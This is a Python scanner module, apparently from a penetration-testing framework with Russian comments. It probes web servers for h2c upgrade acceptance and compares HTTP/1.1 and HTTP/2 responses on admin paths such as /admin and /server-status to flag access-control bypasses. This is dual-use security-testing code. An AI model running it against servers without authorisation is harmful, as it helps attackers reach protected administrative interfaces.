"""h2c_smuggling v2 — HTTP/2 cleartext smuggling with real h2c frames.

Техники:
  1. Baseline: прямой HTTP/1.1 GET — что даёт сервер
  2. h2c upgrade probe: Upgrade + Connection + HTTP2-Settings
  3. Если 101 — отправить HTTP/2 frame через curl_cffi
     (http2_prior_knowledge=True — без upgrade)
  4. Сравнить HTTP/1.1 vs h2c:
     - разные коды для /admin → path confusion
     - 200 для служебных путей через h2c, 403 через HTTP/1.1

Verify ×2 на h2c запросах.
"""
import json
from urllib.parse import urlparse
from core.http import HttpClient
from core.verify import confidence, is_signal


# административные/служебные пути для сравнения
TARGET_PATHS = [
    "/admin", "/administrator", "/internal", "/metrics",
    "/health", "/status", "/debug", "/api/admin",
    "/server-status", "/console", "/manager",
]

# HTTP/2 settings frame (base64) для Upgrade
HTTP2_SETTINGS = "AAMAAABkAAQAAP__"

H2C_HEADERS = {
    "Connection": "Upgrade, HTTP2-Settings",
    "Upgrade": "h2c",
    "HTTP2-Settings": HTTP2_SETTINGS,
}


def _h2c_via_curl_cffi(url, timeout=8):
    """
    Отправляет HTTP/2 h2c запрос через curl_cffi с prior knowledge.
    Возвращает dict {status, size, body, error}.
    """
    try:
        from curl_cffi import requests as cc
        # http2=True + http2_prior_knowledge — h2c без TLS
        # В curl_cffi этот режим эмулируется через http2=True для http://
        r = cc.get(url, http2=True, timeout=timeout, verify=False,
                   allow_redirects=False)
        return {
            "status": r.status_code,
            "size": len(r.content),
            "body": r.text[:2000] if hasattr(r, "text") else "",
            "error": None,
        }
    except Exception as e:
        return {"status": 0, "size": 0, "body": "", "error": str(e)[:120]}


class H2cSmuggling:
    def run(self, session, logger):
        target = session.target
        http = HttpClient(session, logger)

        print(f"[h2c v2] target: {target}")

        u = urlparse(target)
        if u.scheme != "http":
            print(f"[h2c v2] HTTPS target — h2c only works over HTTP. Try http:// variant.")
            # всё равно можно тестировать http:// на тот же хост
            return {"findings": [], "note": "target uses TLS"}

        base = f"{u.scheme}://{u.netloc}"

        # ============================================================
        # Phase 1: baseline HTTP/1.1 на всех путях
        # ============================================================
        print()
        print(f"[h2c v2] Phase 1: baseline HTTP/1.1")
        http1_baselines = {}
        for path in TARGET_PATHS:
            try:
                r = http.get(base + path, allow_redirects=False)
            except Exception:
                continue
            if not r:
                continue
            http1_baselines[path] = {
                "status": r.status_code,
                "size": len(r.content),
            }
            print(f"  HTTP/1.1 {path}: {r.status_code} ({len(r.content)}b)")

        # ============================================================
        # Phase 2: h2c upgrade probe
        # ============================================================
        print()
        print(f"[h2c v2] Phase 2: h2c upgrade probe")
        try:
            r_upg = http.get(target, headers=H2C_HEADERS, allow_redirects=False)
        except Exception:
            r_upg = None

        if not r_upg:
            print(f"  no response")
            return {"findings": []}

        upgrade_hdr = r_upg.headers.get("Upgrade", "")
        connection_hdr = r_upg.headers.get("Connection", "")
        status = r_upg.status_code

        h2c_accepted = (
            status == 101
            or upgrade_hdr.lower() == "h2c"
        )
        print(f"  status={status} Upgrade={upgrade_hdr!r} Connection={connection_hdr!r}")
        print(f"  h2c accepted: {h2c_accepted}")

        findings = []

        if not h2c_accepted:
            print(f"[h2c v2] h2c not accepted by server → 0 findings")
            return {"findings": [], "h2c_accepted": False}

        # Сервер принял upgrade — это уже интересно
        conf = confidence(0.7, 1.0)
        if is_signal(conf, floor=0.55, module="h2c"):
            findings.append({
                "type": "h2c_upgrade_accepted",
                "severity": "medium",
                "status": status,
                "upgrade_header": upgrade_hdr,
                "confidence": conf,
            })
            print(f"  ✓ h2c upgrade accepted")
            logger.finding("h2c_upgrade", "medium",
                           f"status={status} upgrade={upgrade_hdr}")

        # ============================================================
        # Phase 3: HTTP/2 via curl_cffi (prior knowledge)
        # ============================================================
        print()
        print(f"[h2c v2] Phase 3: real HTTP/2 (prior knowledge via curl_cffi)")

        for path in TARGET_PATHS:
            url = base + path
            h2c_result = _h2c_via_curl_cffi(url)

            if h2c_result.get("error"):
                # если конкретно этот путь упал — пропускаем
                continue

            h2c_status = h2c_result.get("status", 0)
            h2c_size = h2c_result.get("size", 0)
            base_res = http1_baselines.get(path, {})
            base_status = base_res.get("status", 0)

            if not h2c_status or not base_status:
                continue

            # path confusion: HTTP/1.1 блокирует, h2c пропускает
            if base_status in (401, 403, 404, 405) and h2c_status == 200:
                # verify ×2
                again = _h2c_via_curl_cffi(url)
                if again.get("status") == 200:
                    conf = confidence(0.9, 1.0)
                    if is_signal(conf, floor=0.55, module="h2c"):
                        findings.append({
                            "type": "h2c_path_confusion",
                            "severity": "critical",
                            "path": path,
                            "http1_status": base_status,
                            "h2c_status": h2c_status,
                            "h2c_size": h2c_size,
                            "verified": True,
                            "confidence": conf,
                        })
                        print(f"  ✓ h2c path confusion: {path} HTTP/1.1={base_status} → h2c={h2c_status}")
                        logger.finding("h2c_smuggling", "critical",
                                       f"{path} {base_status}->{h2c_status} via h2c")
                        continue

            # разные коды — тоже сигнал
            if h2c_status != base_status:
                conf = confidence(0.65, 1.0)
                if is_signal(conf, floor=0.55, module="h2c"):
                    findings.append({
                        "type": "h2c_status_divergence",
                        "severity": "medium",
                        "path": path,
                        "http1_status": base_status,
                        "h2c_status": h2c_status,
                        "confidence": conf,
                    })
                    print(f"  · {path}: HTTP/1.1={base_status} vs h2c={h2c_status}")
                    logger.finding("h2c_divergence", "medium",
                                   f"{path} {base_status} vs {h2c_status}")

        # ============================================================
        # Итог
        # ============================================================
        print()
        print(f"[h2c v2] findings: {len(findings)}")
        return {
            "findings": findings,
            "h2c_accepted": h2c_accepted,
            "http1_baselines": http1_baselines,
        }
